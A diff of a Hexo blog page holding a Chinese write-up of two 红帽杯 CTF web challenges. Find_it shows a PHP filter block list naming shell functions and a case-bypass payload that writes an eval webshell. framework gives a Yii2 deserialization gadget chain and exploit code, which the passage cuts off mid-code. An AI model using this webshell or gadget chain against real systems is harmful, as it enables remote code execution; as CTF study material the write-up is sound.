@@ -1,454 +1,486 @@
+
+
 <!DOCTYPE html>
-<html>
-
-	<head>
-		
-<title>红帽杯-Quiet</title>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<link rel="shortcut icon" type="image/x-icon" href="/image/favicon.ico">
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
 
 
-<meta name="keywords" content="web,ctf,">
-<meta name="description" content="">
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>红帽杯 - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
 
-<script src="/js/jquery.min.js"></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
 
 
-	<meta name="generator" content="Hexo 5.4.0"></head>
 
-	<body>
-		
-<link rel="stylesheet" href="/css/page.css">
+<!-- 主题依赖的图标库，不要自行修改 -->
 
-
-<link rel="stylesheet" href="/css/page_cente.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
 
 
-<link rel="stylesheet" href="/css/atom-one-dark.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
 
 
-<link rel="stylesheet" href="/css/header.css">
+<link  rel="stylesheet" href="/css/main.css" />
 
-	<div class="header">
-		<div class="header-top">
-			<div class="h-left">
-				<a href="/">
-					<img src="/image/logo.png" alt="Quiet">
-				</a>
-			</div>
-			<div class="h-right">
-				<ul>
-					
-						
-								<li>
-									<a href="/">
-										HOME
-									</a>
-									<span class="dot"></span>
-								</li>
-								
-									
-						
-								<li>
-									<a href="/archives">
-										ARCHIVE
-									</a>
-									<span class="dot"></span>
-								</li>
-								
-									
-						
-								<li>
-									<a href="/categories">
-										CATEGORIES
-									</a>
-									<span class="dot"></span>
-								</li>
-								
-									
-						
-								<li>
-									<a href="/tags">
-										TAGS
-									</a>
-									<span class="dot"></span>
-								</li>
-								
-									
-						
-								<li>
-									<a href="/links">
-										LINKS
-									</a>
-									<span class="dot"></span>
-								</li>
-								
-									
-						
-								<li>
-									<a href="/about">
-										ABOUT
-									</a>
-									<span class="dot"></span>
-								</li>
-								
-									
-				</ul>
-			</div>
-			<div class="h-right-close">
-				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
-					<path fill="none" d="M0 0h24v24H0z" />
-					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
-				</svg>
-			</div>
-		</div>
-	</div>
-	<div class="sidebar">
-    <div class="topo">
-        <h2>KKfine</h2>
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
-    <ul>
-        
-        <li>
-            <a href="/">HOME</a>
-        </li>
-        
-        <li>
-            <a href="/archives">ARCHIVE</a>
-        </li>
-        
-        <li>
-            <a href="/categories">CATEGORIES</a>
-        </li>
-        
-        <li>
-            <a href="/tags">TAGS</a>
-        </li>
-        
-        <li>
-            <a href="/links">LINKS</a>
-        </li>
-        
-        <li>
-            <a href="/about">ABOUT</a>
-        </li>
-        
-    </ul>
-    <div class="my_foot">
-        
-        <a target="_blank" rel="noopener" href="https://github.com/qiaobug">
-            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
-        </a>
-        
-    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="红帽杯">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-09 12:46" pubdate>
+        2021年7月9日 下午
+      </time>
+    </span>
+  
 </div>
-<div class='shelter'
-    style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #fffff0;opacity:0.5;z-index: 108;'>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      20
+       分钟
+    </span>
+  
+
+  
+  
 </div>
-<style>
-    .sidebar {
-        width: 0;
-        height: 100%;
-        position: fixed;
-        top: 0;
-        right: 0;
-        bottom: 0;
-        background: #fff;
-        z-index: 999;
-        text-align: center;
-        box-shadow: -6px 0 20px rgba(98, 94, 94, .815)
-    }
 
-    .topo {
-        width: 100%;
-        height: 200px;
-        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
-        background-size: 100% 100%;
-        position: relative;
-        display: flex;
-        align-items: flex-end
-    }
-
-    .topo h2 {
-        color: #fff;
-        z-index: 1;
-        position: relative;
-        margin: 0 0 10px 10px;
-        font-size: 1.2em;
-        box-sizing: border-box
-    }
-
-    .topo:before {
-        content: '';
-        background-image: url(/image/pattern.png);
-        background-repeat: repeat;
-        height: 100%;
-        left: 0;
-        position: absolute;
-        top: 0;
-        width: 100%;
-        z-index: 1
-    }
-
-    .sidebar ul {
-        width: 100%;
-        margin-top: 50px
-    }
-
-    .sidebar ul li {
-        height: 50px;
-        list-style: none;
-        font-size: 1.2em;
-        text-align: right;
-        margin-right: 10px
-    }
-
-    .sidebar ul li a {
-        display: grid;
-        color: #5d606a;
-        text-overflow: ellipsis;
-        width: 100%;
-        text-decoration: none
-    }
-
-    .my_foot {
-        width: 100%;
-        padding: 10px;
-        margin-bottom: 10px;
-        position: absolute;
-        bottom: 0
-    }
-
-    .my_foot a {
-        text-decoration: none;
-        margin-right: 10px;
-        display: inline-block
-    }
-
-    .my_foot a img {
-        width: 30px;
-        height: 30px
-    }
-</style>
-
-<script>
-    $(function () { $('.h-right-close>svg').click(function () { $('.sidebar').animate({ width: "66%" }, 500); $('.shelter').fadeIn("slow") }); $('.shelter').click(function (e) { $('.sidebar').animate({ width: "0" }, 500); $('.shelter').fadeOut("slow") }) })
-</script>
-		<script>
-			$(function () { $(window).scroll(function () { if ($(document).scrollTop() > 100) { $(".header-top").removeClass("header-move2"); $('.header-top').addClass('header-move1') } else { $(".header-top").removeClass("header-move1"); $('.header-top').addClass('header-move2') } }) });
-		</script>
-<div class="header-bg bg-content-img">
-    <div class="bg-content">
-        <ul class="tag">
             
-            
-            <li><a href="/tags/web">web</a></li>
-            
-            <li><a href="/tags/ctf">ctf</a></li>
-            
-            
-        </ul>
-        <h1>红帽杯</h1>
-        <div class="article-info">
-            <div class="article-author">
-                
-                <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
-                    xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
-                    <path
-                        d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
-                        p-id="2902" fill="#ffffff"></path>
-                </svg>
-                
-                <span> <a href="">KKfine</a></span>
-                <p>2021-07-09 12:46:30</p>
-            </div>
+          </div>
+
+          
         </div>
+      </div>
     </div>
-</div>
-<div class="article-content">
-    <div id="article" class="content">
-        <p>题目是在ctfhub上复现的</p>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">红帽杯</h1>
+            
+            <div class="markdown-body">
+              <p>题目是在ctfhub上复现的</p>
 <h2 id="Find-it"><a href="#Find-it" class="headerlink" title="Find_it"></a>Find_it</h2><p>一看应该是文件泄露了，访问了一下robots.txt发现有提示<code>1ndexx.php</code>结合备份文件泄露</p>
 <p>直接访问<code>/.1ndexx.php.swp</code>得到源码(关键代码如下)</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#Really easy...</span><br><br><span class="hljs-variable">$file</span>=fopen(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable 2 open!&quot;</span>);<br><br><span class="hljs-variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> = fread(<span class="hljs-variable">$file</span>,filesize(<span class="hljs-string">&quot;flag.php&quot;</span>));<br><br><br><span class="hljs-variable">$hack</span>=fopen(<span class="hljs-string">&quot;hack.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable 2 open&quot;</span>);<br><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;</span>,<span class="hljs-variable">$a</span>))&#123;<br>	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you die&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$a</span>)&gt;<span class="hljs-number">33</span>)&#123;<br>	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono.&quot;</span>);<br>&#125;<br>fwrite(<span class="hljs-variable">$hack</span>,<span class="hljs-variable">$a</span>);<br>fwrite(<span class="hljs-variable">$hack</span>,<span class="hljs-variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);<br><br>fclose(<span class="hljs-variable">$file</span>);<br>fclose(<span class="hljs-variable">$hack</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#Really easy...</span><br><br><span class="hljs-variable">$file</span>=fopen(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable 2 open!&quot;</span>);<br><br><span class="hljs-variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> = fread(<span class="hljs-variable">$file</span>,filesize(<span class="hljs-string">&quot;flag.php&quot;</span>));<br><br><br><span class="hljs-variable">$hack</span>=fopen(<span class="hljs-string">&quot;hack.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable 2 open&quot;</span>);<br><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;</span>,<span class="hljs-variable">$a</span>))&#123;<br>	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you die&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$a</span>)&gt;<span class="hljs-number">33</span>)&#123;<br>	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono.&quot;</span>);<br>&#125;<br>fwrite(<span class="hljs-variable">$hack</span>,<span class="hljs-variable">$a</span>);<br>fwrite(<span class="hljs-variable">$hack</span>,<span class="hljs-variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);<br><br>fclose(<span class="hljs-variable">$file</span>);<br>fclose(<span class="hljs-variable">$hack</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>代码很简单，传入code过滤了一堆东西，然后写入文件。显然是要写入木马之类的。</p>
 <p>这里有几个绕过方法，大小写绕过，构造为</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?code=%<span class="hljs-number">3</span>C?php%<span class="hljs-number">20</span><span class="hljs-keyword">Eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);?%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=%<span class="hljs-number">3</span>C?php%<span class="hljs-number">20</span><span class="hljs-keyword">Eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);?%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure>
 
 <p>蚁剑连接即可</p>
-<p><img src="https://img-blog.csdnimg.cn/20210709125140850.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210709125140850.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p>另外一个思路是网上看的，用<code>show_source() 函数对文件进行语法高亮显示。</code></p>
 <p>构造payload：<code>?code=&lt;?php show_source(__FILE__);?&gt;</code>然后访问<code>hack.php</code>,但是我在ctfhub没有做成功也不知道为啥….</p>
 <h2 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h2><p>现成的yii2的反序列化，感觉现在看这些框架不是那么陌生了。</p>
 <p>先分析了一下网上的复现过程，一条链是从</p>
-<p><img src="https://img-blog.csdnimg.cn/202107101335156.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/202107101335156.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p>跟进reset函数</p>
-<p><img src="https://img-blog.csdnimg.cn/20210710133553865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210710133553865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p>调用了别的地方的close函数，这里的<code>_dataReader</code>是可控的，想办法调用<code>__call</code>函数。全局搜索一下__call，最后在<code>\vendor\fzaninotto\faker\src\Faker\Generator.php</code>找到了一个合适的__call方法：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210710134209695.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210710134209695.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p><code>$method</code>即为<code>close</code>，参数为空，跟进format：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210710134258823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210710134258823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p>看到<code>call_user_func_array</code>就好办了，跟进getFormatter函数，这里<code>$this-&gt;formatters</code>可控，因此<code>getFormatter</code>方法的返回值也是我们可控的，因此<code>call_user_func_array($this-&gt;getFormatter($formatter), $arguments)</code>;中，回调函数是我们可控的，但是<code>$arguments</code>为空，所以相当于我们现在能干两件事，可以调用yii2中任意的一个无参方法，或者调用原生php的类似phpinfo()这样的无参方法，但是第二种肯定不能RCE，因此还要在yii2中已有的无参方法中进行挖掘：</p>
 <p>最后找到的<code>rest/CreateAction.php以及rest/IndexAction.php</code>都很好用。这里分析一下IndexAction.php：<br>主要是它的run方法：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210710134545205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210710134545205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p><code>$this-&gt;checkAccess</code>和<code>$this-&gt;id</code>都是我们可控的，相当于直接函数名和参数都可控了，反序列化链至此结束。</p>
 <p>题目给的这个题，反序列化入口很容易找到：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210710140803158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210710140803158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p>现在整个看下来，这个链还是比较好理解的。</p>
 <p>exp：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;<br>    &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(),<span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br>    <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&quot;phpinfo&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br><br>    <span class="hljs-keyword">echo</span> base64_encode(<br>        serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;<br>    &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(),<span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br>    <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&quot;phpinfo&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&quot;1&quot;</span>;<br>        